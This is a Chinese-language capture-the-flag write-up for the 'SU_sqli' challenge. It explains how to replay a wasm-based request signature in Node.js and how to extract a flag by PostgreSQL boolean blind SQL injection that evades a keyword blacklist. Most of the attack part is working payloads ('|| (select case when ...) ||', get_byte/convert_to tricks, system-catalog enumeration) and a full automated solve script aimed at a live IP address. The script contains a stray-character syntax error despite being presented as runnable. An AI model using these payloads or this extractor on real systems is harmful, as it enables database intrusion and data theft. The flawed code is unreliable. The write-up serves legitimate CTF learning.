# SU_sqli Writeup

## 题目信息

- 题目地址：`http://101.245.108.250:10001/`
- 已给源码目录：`./application`
- 最终 flag：`SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}`

---

## 这题到底在考什么

这题表面上看像“前端加密 + WebAssembly + 签名校验”的题。

很多人第一眼会被两个 `.wasm` 文件吓住，以为要先把算法完整逆出来，才能继续做。

其实不用。

这题真正的漏洞点还是：

`SQL 注入`

只是出题人为了不让你直接抓包乱发请求，在前面套了一层“必须带签名才能访问 `/api/query`”。

所以这题的正确思路是：

1. 先看懂前端怎么生成签名
2. 在本地复用前端逻辑，生成合法签名
3. 带着合法签名去打 `/api/query`
4. 找 SQL 注入点
5. 盲注出数据库里的 flag

---

## 第一步：先看前端源码

重点看 `application/app.js`。

前端的主要流程是：

1. 页面输入一个关键词 `q`
2. 请求 `/api/sign`
3. 服务器返回：
   - `nonce`
   - `ts`
   - `seed`
   - `salt`
4. 前端加载两个 wasm：
   - `crypto1.wasm`
   - `crypto2.wasm`
5. 调用：
   - `__suPrep(...)`
   - `unscramble(...)`
   - `mixSecret(...)`
   - `__suFinish(...)`
6. 生成最终 `sign`
7. `POST /api/query`

也就是说：

`/api/query` 不是不能打，而是必须带一份正确的签名。

所以我们不需要把算法“手写重现”出来，最简单的方法是：

`直接在 Node.js 里加载 wasm 和 wasm_exec.js，把前端流程原样跑一遍`

这一步是整道题最关键的破局点。

---

## 第二步：确认 SQL 注入是否存在

我们先构造一个最简单的查询，把 `q` 设置成单引号：

```text
'
```

服务器返回报错：

```text
ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE 42601)
```

这句话说明了两件事：

### 1. 后端数据库是 PostgreSQL

因为它报的是：

`SQLSTATE 42601`

这是 PostgreSQL 很典型的错误格式。

### 2. `q` 被拼进了单引号字符串里

也就是后端大概率写了类似这样的 SQL：

```sql
SELECT id, title FROM posts
WHERE title LIKE '%用户输入的q%'
LIMIT 20;
```

如果把 `q` 直接替换成 `'`，那 SQL 就会被截断，所以出现“单引号没闭合”的错误。

这就证明：

`这里存在 SQL 注入`

---

## 第三步：为什么普通注入 payload 不行

很多人这时候会直接试：

```sql
' or 1=1 -- 
```

或者：

```sql
' union select 1,2 -- 
```

但这题会返回：

```text
blocked
```

说明后端做了一个非常粗糙的黑名单过滤，至少拦了这些关键词：

- `or`
- `and`
- `--`
- `/*`
- `;`
- `union`

所以传统的报错注入、联合注入、注释截断，基本都走不通。

这时候要换一种思路：

`不去闭合整个 SQL 结构，而是在字符串表达式内部做文章`

---

## 第四步：找到能绕过黑名单的注入方式

既然原始查询很像：

```sql
title LIKE '%q%'
```

那么如果我们把 `q` 写成：

```sql
' || (select '') || '
```

拼回 SQL 之后就会变成：

```sql
title LIKE '%' || (select '') || '%'
```

这在 PostgreSQL 里是合法的。

因为：

- `||` 是字符串拼接
- `select ''` 返回空字符串

这样我们就成功“进入了 SQL 表达式”，而且没有用到：

- `or`
- `and`
- `union`
- `--`

这就是这题真正的绕过点。

---

## 第五步：把返回结果变成“真假信号”

有了表达式注入之后，我们还需要一个方法判断条件真假。

这题最方便的办法是构造：

```sql
' || (select case when 条件 then '' else 'qzjxk' end) || '
```

拼回去以后就是：

```sql
title LIKE '%' || (
  select case
    when 条件 then ''
    else 'qzjxk'
  end
) || '%'
```

它的效果非常好理解：

### 如果条件为真

返回空字符串 `''`，那么 SQL 变成：

```sql
title LIKE '%%'
```

这会匹配所有帖子，所以页面会返回数据。

### 如果条件为假

返回一个几乎不可能命中的字符串，比如 `qzjxk`，SQL 变成：

```sql
title LIKE '%qzjxk%'
```

这通常匹配不到任何帖子，所以返回空数组。

于是我们就得到了一个非常稳定的布尔盲注信号：

- 有结果：条件为真
- 没结果：条件为假

---

## 第六步：先枚举表名

PostgreSQL 里可以通过系统表 `pg_class` 看所有表。

我们最后用的枚举思路是：

```sql
(select relname
 from (select relname,relnamespace from pg_class where relkind='r') c
 where relnamespace=(select oid from pg_namespace where nspname=current_schema())
 limit 1 offset 0)
```

解释一下：

- `pg_class`：系统表，能看到表名
- `relkind='r'`：只看普通表
- `current_schema()`：当前 schema
- `limit 1 offset n`：第 `n` 张表

再配合 `substring(...,位置,1)`，一位一位猜字符，就能把表名盲出来。

最后枚举得到当前业务相关表：

- `posts`
- `secrets`

看到 `secrets` 的时候，基本就知道 flag 多半在这里了。

---

## 第七步：枚举 `secrets` 的列名

PostgreSQL 里可以通过 `pg_attribute` 看列名。

利用的表达式是：

```sql
(select attname
 from (select attname,attrelid from pg_attribute where attnum>0) a
 where attrelid=(select oid from pg_class where relname='secrets' limit 1)
 limit 1 offset 0)
```

同样一位一位盲出来。

最终得到 `secrets` 表的列：

- `id`
- `flag`

到这里已经稳了。

---

## 第八步：为什么不能直接用 `ascii()`

很多人做盲注时喜欢用：

```sql
ascii(substring(...))
```

但这题后端会把 `ascii` 也拦掉，直接返回 `blocked`。

所以我们换成 PostgreSQL 另一种办法：

```sql
get_byte(convert_to(substring(内容,位置,1),'SQL_ASCII'),0)
```

它的意思是：

1. 先把某个字符取出来
2. 转成字节串
3. 再取第 0 个字节

这样就拿到了这个字符的 ASCII 值。

然后就可以二分查找，效率比一个个字符试更高。

---

## 第九步：完整利用流程总结

整道题可以浓缩成下面几步：

1. 读前端源码，确认 `/api/query` 需要签名
2. 在 Node.js 里加载：
   - `wasm_exec.js`
   - `crypto1.wasm`
   - `crypto2.wasm`
3. 调 `/api/sign` 获取签名材料
4. 生成 `sign`
5. 发送带签名的 `/api/query`
6. 用单引号确认存在 PostgreSQL 注入
7. 发现常规关键字被黑名单拦截
8. 改用字符串拼接注入：

```sql
' || (...) || '
```

9. 用 `CASE WHEN` 构造真假信号
10. 先枚举表名，再枚举列名
11. 最后从 `secrets.flag` 中盲出 flag

---

## 第十步：完整解题脚本

下面这个脚本是可以直接跑的完整版本。

你只需要把它保存成 `solve.js`，然后执行：

```bash
node solve.js
```

就能自动跑出 flag。

```js
const fs = require("fs");
const vm = require("vm");
const { performance } = require("perf_hooks");
const { webcrypto } = require("crypto");

globalThis.performance = performance;
globalThis.crypto = webcrypto;
globalThis.navigator = {
  userAgent:
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  userAgentData: {
    brands: [
      { brand: "Chromium", version: "122" },
      { brand: "Google Chrome", version: "122" },
    ],
  },
  webdriver: false,
};

globalThis.atob = (s) => Buffer.from(s, "base64").toString("binary");
globalThis.btoa = (s) => Buffer.from(s, "binary").toString("base64");

vm.runInThisContext(fs.readFileSync("./application/wasm_exec.js", "utf8"));

function b64UrlToBytes(s) {
  let t = s.replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4) t += "=";
  return Uint8Array.from(Buffer.from(t, "base64"));
}

function bytesToB64Url(bytes) {
  return Buffer.from(bytes)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

function rotl32(x, r) {
  return ((x << r) | (x >>> (32 - r))) >>> 0;
}

function rotr32(x, r) {
  return ((x >>> r) | (x << (32 - r))) >>> 0;
}

const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];

function maskBytes(nonceB64, ts) {
  const nb = b64UrlToBytes(nonceB64);
  let s = 0 >>> 0;
  for (let i = 0; i < nb.length; i++) {
    s = (Math.imul(s, 131) + nb[i]) >>> 0;
  }
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = new Uint8Array(32);
  for (let i = 0; i < 32; i++) {
    s ^= (s << 13) >>> 0;
    s ^= s >>> 17;
    s ^= (s << 5) >>> 0;
    out[i] = s & 0xff;
  }
  return out;
}

function unscramble(pre, nonceB64, ts) {
  const buf = b64UrlToBytes(pre);
  for (let i = 0; i < 8; i++) {
    const o = i * 4;
    let w =
      (buf[o] |
        (buf[o + 1] << 8) |
        (buf[o + 2] << 16) |
        (buf[o + 3] << 24)) >>> 0;
    w = rotr32(w, rotScr[i]);
    buf[o] = w & 0xff;
    buf[o + 1] = (w >>> 8) & 0xff;
    buf[o + 2] = (w >>> 16) & 0xff;
    buf[o + 3] = (w >>> 24) & 0xff;
  }
  const mask = maskBytes(nonceB64, ts);
  for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
  return buf;
}

function probeMask(probe, ts) {
  let s = 0 >>> 0;
  for (let i = 0; i < probe.length; i++) {
    s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
  }
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = new Uint8Array(32);
  for (let i = 0; i < 32; i++) {
    s = (Math.imul(s, 1103515245) + 12345) >>> 0;
    out[i] = (s >>> 16) & 0xff;
  }
  return out;
}

function mixSecret(buf, probe, ts) {
  const mask = probeMask(probe, ts);
  if (mask[0] & 1) {
    for (let i = 0; i < 32; i += 2) {
      const t = buf[i];
      buf[i] = buf[i + 1];
      buf[i + 1] = t;
    }
  }
  if (mask[1] & 2) {
    for (let i = 0; i < 8; i++) {
      const o = i * 4;
      let w =
        (buf[o] |u
          (buf[o + 1] << 8) |
          (buf[o + 2] << 16) |
          (buf[o + 3] << 24)) >>> 0;
      w = rotl32(w, 3);
      buf[o] = w & 0xff;
      buf[o + 1] = (w >>> 8) & 0xff;
      buf[o + 2] = (w >>> 16) & 0xff;
      buf[o + 3] = (w >>> 24) & 0xff;
    }
  }
  for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
  return buf;
}

async function loadWasm(path) {
  const go = new Go();
  const buf = fs.readFileSync(path);
  const { instance } = await WebAssembly.instantiate(buf, go.importObject);
  go.run(instance);
}

async function initWasm() {
  await loadWasm("./application/crypto1.wasm");
  await loadWasm("./application/crypto2.wasm");
  for (let i = 0; i < 100; i++) {
    if (
      typeof globalThis.__suPrep === "function" &&
      typeof globalThis.__suFinish === "function"
    ) {
      return;
    }
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("wasm init failed");
}

const ua = navigator.userAgent || "";
const brands =
  navigator.userAgentData?.brands
    ?.map((b) => b.brand + ":" + b.version)
    .join(",") || "";
const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
const intl = Intl.DateTimeFormat().resolvedOptions().locale ? "1" : "0";
const wd = navigator.webdriver ? "1" : "0";
const probe = `wd=${wd};tz=${tz};b=${brands};intl=${intl}`;

async function signedQuery(q) {
  const signRes = await fetch("http://101.245.108.250:10001/api/sign", {
    headers: { "User-Agent": ua },
  });
  const material = (await signRes.json()).data;

  const pre = globalThis.__suPrep(
    "POST",
    "/api/query",
    q,
    material.nonce,
    String(material.ts),
    material.seed,
    material.salt,
    ua,
    probe
  );

  const secret2 = unscramble(pre, material.nonce, material.ts);
  const mixed = mixSecret(secret2, probe, material.ts);

  const sig = globalThis.__suFinish(
    "POST",
    "/api/query",
    q,
    material.nonce,
    String(material.ts),
    bytesToB64Url(mixed),
    probe
  );

  const res = await fetch("http://101.245.108.250:10001/api/query", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": ua,
    },
    body: JSON.stringify({
      q,
      nonce: material.nonce,
      ts: material.ts,
      sign: sig,
    }),
  });

  return await res.json();
}

function boolPayload(cond) {
  return `' || (select case when ${cond} then '' else 'qzjxk' end) || '`;
}

async function testCond(cond) {
  const out = await signedQuery(boolPayload(cond));
  if (!out.ok) {
    throw new Error(out.error);
  }
  return out.data.length === 3;
}

async function extractAsciiExpr(expr, maxLen = 80) {
  let out = "";
  for (let pos = 1; pos <= maxLen; pos++) {
    if (await testCond(`substring(${expr},${pos},1)=''`)) break;

    let lo = 32;
    let hi = 126;
    while (lo < hi) {
      const mid = Math.floor((lo + hi + 1) / 2);
      const cond =
        `get_byte(convert_to(substring(${expr},${pos},1),'SQL_ASCII'),0)>=${mid}`;
      if (await testCond(cond)) {
        lo = mid;
      } else {
        hi = mid - 1;
      }
      await new Promise((r) => setTimeout(r, 15));
    }

    const ch = String.fromCharCode(lo);
    out += ch;
    process.stdout.write(ch);
  }
  process.stdout.write("\n");
  return out;
}

async function main() {
  await initWasm();

  console.log("[*] dump table names");
  for (let off = 0; off < 5; off++) {
    const expr =
      `(select relname from (select relname,relnamespace from pg_class where relkind='r') c ` +
      `where relnamespace=(select oid from pg_namespace where nspname=current_schema()) ` +
      `limit 1 offset ${off})`;
    process.stdout.write(`table[${off}] = `);
    const name = await extractAsciiExpr(expr, 24);
    if (!name) break;
  }

  console.log("[*] dump secrets columns");
  for (let off = 0; off < 5; off++) {
    const expr =
      `(select attname from (select attname,attrelid from pg_attribute where attnum>0) a ` +
      `where attrelid=(select oid from pg_class where relname='secrets' limit 1) ` +
      `limit 1 offset ${off})`;
    process.stdout.write(`secrets.col[${off}] = `);
    const name = await extractAsciiExpr(expr, 24);
    if (!name) break;
  }

  console.log("[*] dump flag");
  process.stdout.write("flag = ");
  await extractAsciiExpr(`(select flag from secrets limit 1)`, 80);
}

main().catch(console.error);
```

---

## 第十一步：脚本运行后会看到什么

正常情况下，脚本会依次跑出：

```text
table[0] = posts
table[1] = secrets
secrets.col[0] = id
secrets.col[1] = flag
flag = SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```

---

## 第十二步：这题最值得记住的点

这题真正值得学会的，不是某个具体 payload，而是下面这几个思路：

### 1. 前端“签名”不等于无解

如果签名逻辑在前端，那你就能复用它。

即使有 wasm，也不代表必须先逆向到底。

很多时候：

`复用 > 重写`

### 2. 黑名单不是防注入

它只会挡住最基础的 payload。

但只要 SQL 结构还能被你控制，总能找到别的表达式写法绕过去。

### 3. PostgreSQL 的字符串拼接很适合绕过

像这种：

```sql
' || (...) || '
```

在 `LIKE '%q%'` 这种场景里特别好用。

### 4. 盲注不一定非要 `ascii()`

被拦了就换思路。

PostgreSQL 里很多函数都能拿到字符字节值，比如：

```sql
get_byte(convert_to(...),0)
```

---

## 最终答案

```text
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```
